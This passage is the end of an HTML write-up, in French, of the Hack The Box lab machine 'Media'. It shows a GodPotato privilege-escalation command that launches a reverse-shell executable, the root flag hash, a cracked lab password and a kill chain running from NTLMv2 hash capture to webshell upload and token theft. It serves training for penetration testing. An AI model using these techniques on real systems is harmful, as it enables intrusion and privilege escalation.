+    <span class="arrow">▼</span>
+<span class="node">[Windows RPCSS / DCOM]</span>
+    <span class="arrow">│</span>
+    <span class="arrow">│  2.</span> Force SYSTEM à se connecter
+    <span class="arrow">▼</span>
+<span class="highlight">[GodPotato intercepte]</span>
+    <span class="arrow">│</span>
+    <span class="arrow">│  3.</span> <span class="highlight">ImpersonateNamedPipeClient()</span> → vole le token
+    <span class="arrow">▼</span>
+<span class="result">[NT AUTHORITY\SYSTEM]</span> 🎉</div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">CMD</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre>C:\Windows\Temp\<span class="cmd">GodPotato.exe</span> <span class="flag">-cmd</span> <span class="string">"C:\Windows\Temp\rev3.exe"</span>
+
+<span class="comment">[*] HookRPC            ← intercepte les appels RPC</span>
+<span class="comment">[*] CreateNamedPipe    ← crée le faux serveur</span>
+<span class="comment">[*] Trigger RPCSS      ← force SYSTEM à se connecter</span>
+<span class="result">[*] CurrentUser: NT AUTHORITY\SYSTEM</span></pre>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-icon">🏴</div>
+      <div class="flag-content">
+        <div class="flag-label">Root Flag</div>
+        <div class="flag-hash">2e90d404c01659f76e693a21c16d45f4</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="sep"></div>
+
+<!-- ==================== KILL CHAIN ==================== -->
+<section class="phase">
+  <div class="phase-header">
+    <div class="phase-number access">∞</div>
+    <div class="phase-title">
+      Kill Chain Complète
+      <small>Vue d'ensemble de la chaîne d'exploitation</small>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-line">
+          <div class="chain-dot active"></div>
+          <div class="chain-connector"></div>
+        </div>
+        <div class="chain-content">
+          <h4>Recon — Nmap</h4>
+          <p>Ports 22/80/3389 · Windows Server 2022 · ProMotion Studio (PHP/Apache)</p>
+        </div>
+      </div>
+      <div class="chain-step">
+        <div class="chain-line">
+          <div class="chain-dot active"></div>
+          <div class="chain-connector"></div>
+        </div>
+        <div class="chain-content">
+          <h4>NTLMv2 Capture — .asx + Responder</h4>
+          <p>Hash NTLMv2 de MEDIA\enox capturé via fichier .asx malicieux</p>
+        </div>
+      </div>
+      <div class="chain-step">
+        <div class="chain-line">
+          <div class="chain-dot active"></div>
+          <div class="chain-connector"></div>
+        </div>
+        <div class="chain-content">
+          <h4>Hash Cracking — Hashcat + rockyou.txt</h4>
+          <p>enox : 1234virus@</p>
+        </div>
+      </div>
+      <div class="chain-step">
+        <div class="chain-line">
+          <div class="chain-dot active"></div>
+          <div class="chain-connector"></div>
+        </div>
+        <div class="chain-content">
+          <h4>Initial Access — SSH</h4>
+          <p>Shell MEDIA\enox · user.txt récupéré</p>
+        </div>
+      </div>
+      <div class="chain-step">
+        <div class="chain-line">
+          <div class="chain-dot active"></div>
+          <div class="chain-connector"></div>
+        </div>
+        <div class="chain-content">
+          <h4>Code Review — index.php</h4>
+          <p>Upload sans validation · chemin prévisible · zone sensible</p>
+        </div>
+      </div>
+      <div class="chain-step">
+        <div class="chain-line">
+          <div class="chain-dot active"></div>
+          <div class="chain-connector"></div>
+        </div>
+        <div class="chain-content">
+          <h4>Junction Attack — mklink /J + webshell</h4>
+          <p>RCE en NT AUTHORITY\LOCAL SERVICE via redirection du dossier upload</p>
+        </div>
+      </div>
+      <div class="chain-step">
+        <div class="chain-line">
+          <div class="chain-dot active"></div>
+          <div class="chain-connector"></div>
+        </div>
+        <div class="chain-content">
+          <h4>FullPowers — Restauration des privilèges</h4>
+          <p>SeTcbPrivilege réactivé → SeImpersonatePrivilege restauré</p>
+        </div>
+      </div>
+      <div class="chain-step">
+        <div class="chain-line">
+          <div class="chain-dot active"></div>
+        </div>
+        <div class="chain-content">
+          <h4>GodPotato — Potato Attack → SYSTEM</h4>
+          <p>Faux serveur COM → SYSTEM se connecte → vol du token → NT AUTHORITY\SYSTEM</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="sep"></div>
+
+<!-- ==================== TOOLS ==================== -->
+<section class="phase">
+  <div class="phase-header">
+    <div class="phase-number recon">🛠</div>
+    <div class="phase-title">
+      Arsenal
+      <small>Outils utilisés durant l'exploitation</small>
+    </div>
+  </div>
+
+  <div class="tool-grid">
+    <div class="tool-card">
+      <div class="tool-name">Nmap</div>
+      <div class="tool-role">Scanner de ports — détecte services, versions et OS</div>
+    </div>
+    <div class="tool-card">
+      <div class="tool-name">Responder</div>
+      <div class="tool-role">Capture hashes NTLMv2 via faux serveurs SMB/HTTP</div>
+    </div>
+    <div class="tool-card">
+      <div class="tool-name">Hashcat</div>
+      <div class="tool-role">Cracking GPU ultra-rapide avec dictionnaire</div>
+    </div>
+    <div class="tool-card">
+      <div class="tool-name">mklink /J</div>
+      <div class="tool-role">Commande native Windows — junction pour rediriger les écritures</div>
+    </div>
+    <div class="tool-card">
+      <div class="tool-name">curl</div>
+      <div class="tool-role">Upload webshell via formulaire HTTP multipart</div>
+    </div>
+    <div class="tool-card">
+      <div class="tool-name">msfvenom</div>
+      <div class="tool-role">Génération de reverse shells Windows stables</div>
+    </div>
+    <div class="tool-card">
+      <div class="tool-name">FullPowers</div>
+      <div class="tool-role">Réactive SeTcbPrivilege → restaure SeImpersonatePrivilege</div>
+    </div>
+    <div class="tool-card">
+      <div class="tool-name">GodPotato</div>
+      <div class="tool-role">Potato attack — SeImpersonatePrivilege → SYSTEM</div>
+    </div>
+  </div>
+</section>
+
+</div>
+
+<!-- ==================== FOOTER ==================== -->
+<footer class="footer">
+  <span class="htb-green">■</span> HTB CPTS — MEDIA — <span class="htb-green">Pwned</span> · 2025
+</footer>
+
+</body>
+</html>
